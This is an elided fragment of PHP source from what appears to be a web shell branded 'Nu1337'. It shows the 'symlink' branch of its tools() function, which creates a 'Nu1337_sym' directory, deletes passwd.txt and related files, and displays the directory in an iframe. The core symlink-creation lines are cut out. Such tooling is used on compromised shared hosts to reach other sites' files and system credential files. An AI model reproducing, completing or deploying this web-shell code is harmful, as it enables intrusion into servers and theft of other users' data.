...
function tools($toolsname, $args = null) {
	...
	elseif($toolsname === "symlink") {
		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'Nu1337_sym'."));
		if(!is_dir(path()."/Nu1337_sym/")) {
			...
			@unlink("passwd.txt");
			@unlink("Nu1337_sym/pas.txt");
			@unlink("Nu1337_sym/nemu.txt");
		}

		print "<div style='background: #ffffff; width: 100%; height: 100%'>";
		print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/Nu1337_sym/' frameborder='0' scrolling='yes'></iframe>";
		print "</div>";
	}
